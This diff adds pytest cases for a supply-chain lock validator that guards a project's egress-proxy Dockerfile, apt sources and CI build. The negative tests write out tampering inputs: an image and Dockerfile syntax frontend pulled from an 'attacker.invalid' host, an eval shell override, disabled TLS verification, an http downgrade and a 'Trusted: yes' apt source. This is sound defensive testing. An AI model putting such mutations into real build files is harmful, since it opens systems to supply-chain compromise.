@@ -63,6 +63,254 @@ def test_supply_chain_manifest_matches_pinned_sources_and_hashed_lock():
     assert "io.lecturesift.supply-chain-lock-sha256" in proxy
 
 
+def test_proxy_bootstraps_ca_from_locked_image_and_uses_https_only():
+    proxy = (ROOT / "deploy/egress-proxy/Dockerfile").read_text(encoding="utf-8")
+    manifest = dict(
+        line.split("=", 1)
+        for line in (ROOT / "deploy/supply_chain.lock")
+        .read_text(encoding="utf-8")
+        .splitlines()
+    )
+
+    ca_path = "/etc/ssl/certs/ca-certificates.crt"
+    ca_copy = f"COPY --from={manifest['application_base']} {ca_path} {ca_path}"
+    update = "update --error-on=any;"
+    install_proxy = (
+        "install -y --no-install-recommends "
+        "ca-certificates squid squidclient;"
+    )
+
+    assert ca_copy in proxy
+    assert proxy.count("FROM ") == 1
+    assert proxy.index(ca_copy) < proxy.index("RUN set -eux;")
+    assert proxy.index("URIs: https://snapshot.debian.org") < proxy.index(update)
+    assert proxy.index(update) < proxy.index(install_proxy)
+    assert proxy.count("Acquire::https::CAInfo=" + ca_path) == 2
+    assert "Acquire::https::Verify-Peer=true" in proxy
+    assert "Acquire::https::Verify-Host=true" in proxy
+    assert "test ! -L " + ca_path in proxy
+    assert proxy.count(update) == 1
+    assert proxy.count("rm -rf /var/lib/apt/lists/*") == 1
+    assert "http://snapshot.debian.org" not in proxy
+    assert "allow-insecure" not in proxy.lower()
+    assert "trusted=yes" not in proxy.lower()
+
+
+@pytest.mark.parametrize(
+    "before,after",
+    [
+        (
+            "COPY --from=python:3.12-slim@sha256:",
+            "COPY --from=python:3.12-slim@sha256:0",
+        ),
+        (
+            "Acquire::https::Verify-Peer=true",
+            "Acquire::https::Verify-Peer=false",
+        ),
+        (
+            "Acquire::https::Verify-Host=true",
+            "Acquire::https::Verify-Host=false",
+        ),
+        (
+            "update --error-on=any;",
+            "update;",
+        ),
+        (
+            "test -s /etc/ssl/certs/ca-certificates.crt;",
+            "true;",
+        ),
+        (
+            "https://snapshot.debian.org/archive/debian/",
+            "http://snapshot.debian.org/archive/debian/",
+        ),
+        (
+            "Acquire::https::CAInfo=/etc/ssl/certs/ca-certificates.crt",
+            "Acquire::https::CAInfo=/tmp/unreviewed-ca.crt",
+        ),
+        (
+            "'Check-Valid-Until: no' \\",
+            "'Check-Valid-Until: no' 'Trusted: yes' \\",
+        ),
+    ],
+)
+def test_supply_chain_manifest_rejects_proxy_ca_bootstrap_drift(
+    tmp_path, before, after
+):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
+    source = proxy.read_text(encoding="utf-8")
+    assert before in source
+    proxy.write_text(source.replace(before, after, 1), encoding="utf-8")
+
+    with pytest.raises(module.SupplyChainError):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_rejects_an_extra_proxy_ca_source(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
+    source = proxy.read_text(encoding="utf-8")
+    proxy.write_text(
+        source
+        + "\nCOPY --from=attacker.invalid/image:latest /ca.crt /tmp/ca.crt\n",
+        encoding="utf-8",
+    )
+
+    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
+        module.validate(root)
+
+
+@pytest.mark.parametrize(
+    "injection",
+    [
+        "COPY ca-certificates.crt /etc/ssl/certs/",
+        "COPY debian-archive-keyring.gpg /usr/share/keyrings/",
+        "ADD ca-certificates.crt /etc/ssl/certs/",
+        'COPY [\"ca-certificates.crt\", \"/etc/ssl/certs/\"]',
+    ],
+)
+def test_supply_chain_manifest_rejects_local_trust_shadowing(tmp_path, injection):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
+    source = proxy.read_text(encoding="utf-8")
+    proxy.write_text(
+        source.replace("RUN set -eux;", injection + "\n\nRUN set -eux;", 1),
+        encoding="utf-8",
+    )
+
+    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
+        module.validate(root)
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    [
+        lambda source: "# syntax=attacker.invalid/dockerfile:latest\n" + source,
+        lambda source: "# escape=" + chr(96) + "\n" + source,
+        lambda source: "# check=skip=all\n" + source,
+        lambda source: source.replace(
+            "RUN set -eux;",
+            'SHELL ["/bin/sh", "-c", "eval \\"$0\\""]\n\nRUN set -eux;',
+            1,
+        ),
+        lambda source: source.replace(
+            "COPY squid.conf /etc/squid/squid.conf",
+            "RUN /usr/bin/apt install -y curl\n\n"
+            "COPY squid.conf /etc/squid/squid.conf",
+            1,
+        ),
+        lambda source: source.replace(
+            "RUN set -eux;",
+            "ENV APT_CONFIG=/tmp/unreviewed-apt.conf\n\nRUN set -eux;",
+            1,
+        ),
+    ],
+)
+def test_supply_chain_manifest_rejects_proxy_instruction_semantic_bypasses(
+    tmp_path, mutation
+):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
+    source = proxy.read_text(encoding="utf-8")
+    changed = mutation(source)
+    assert changed != source
+    proxy.write_text(changed, encoding="utf-8")
+
+    with pytest.raises(module.SupplyChainError):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_rejects_a_late_proxy_ca_copy(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
+    source = proxy.read_text(encoding="utf-8")
+    copy_line = next(
+        line for line in source.splitlines() if line.startswith("COPY --from=")
+    )
+    proxy.write_text(
+        source.replace(copy_line + "\n", "", 1) + "\n" + copy_line + "\n",
+        encoding="utf-8",
+    )
+
+    with pytest.raises(module.SupplyChainError, match="copied too late"):
+        module.validate(root)
+
+
+def test_proxy_ca_copy_is_bound_to_a_changed_valid_application_digest(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    replacement = "python:3.12-slim@sha256:" + "a" * 64
+    manifest = root / "deploy" / "supply_chain.lock"
+    manifest_source = manifest.read_text(encoding="utf-8")
+    current = re.search(r"^application_base=(.+)$", manifest_source, re.MULTILINE).group(1)
+    manifest.write_text(
+        manifest_source.replace(
+            f"application_base={current}", f"application_base={replacement}", 1
+        ),
+        encoding="utf-8",
+    )
+    dockerfile = root / "Dockerfile"
+    dockerfile.write_text(
+        dockerfile.read_text(encoding="utf-8").replace(
+            f"FROM {current}", f"FROM {replacement}", 1
+        ),
+        encoding="utf-8",
+    )
+
+    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_requires_fail_closed_apt_update(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    dockerfile = root / "Dockerfile"
+    source = dockerfile.read_text(encoding="utf-8")
+    assert "apt-get update --error-on=any;" in source
+    dockerfile.write_text(
+        source.replace("apt-get update --error-on=any;", "apt-get update;", 1),
+        encoding="utf-8",
+    )
+
+    with pytest.raises(module.SupplyChainError, match="locked command"):
+        module.validate(root)
+
+
+@pytest.mark.parametrize(
+    "injection",
+    [
+        "# syntax=attacker.invalid/dockerfile:latest\n",
+        'SHELL ["/bin/sh", "-c"]\n',
+    ],
+)
+def test_application_dockerfile_rejects_unlocked_execution_semantics(
+    tmp_path, injection
+):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    dockerfile = root / "Dockerfile"
+    source = dockerfile.read_text(encoding="utf-8")
+    dockerfile.write_text(injection + source, encoding="utf-8")
+
+    with pytest.raises(module.SupplyChainError):
+        module.validate(root)
+
+
+def test_ci_rebuilds_and_smokes_the_locked_proxy_without_cache():
+    workflow = (ROOT / ".github/workflows/test.yml").read_text(encoding="utf-8")
+
+    assert "python3 deploy/supply_chain_lock.py --root ." in workflow
+    assert "docker build --pull --no-cache --platform linux/amd64" in workflow
+    assert "lecturesift-egress-proxy:ci" in workflow
+    assert "docker run --rm --network none" in workflow
+    assert "dpkg-query -W ca-certificates squid squidclient" in workflow
+
+
 def test_supply_chain_requirement_digests_are_line_ending_stable(tmp_path):
     module = _module()
     root = _copy_contract(tmp_path)
@@ -274,8 +522,9 @@ def test_supply_chain_manifest_rejects_extra_command_inside_apt_provisioning(tmp
     dockerfile = root / "Dockerfile"
     dockerfile.write_text(
         dockerfile.read_text(encoding="utf-8").replace(
-            "    apt-get update; \\\n",
-            "    printf unreviewed-command >/tmp/source-state; apt-get update; \\\n",
+            "    apt-get update --error-on=any; \\\n",
+            "    printf unreviewed-command >/tmp/source-state; "
+            "apt-get update --error-on=any; \\\n",
             1,
         ),
         encoding="utf-8",
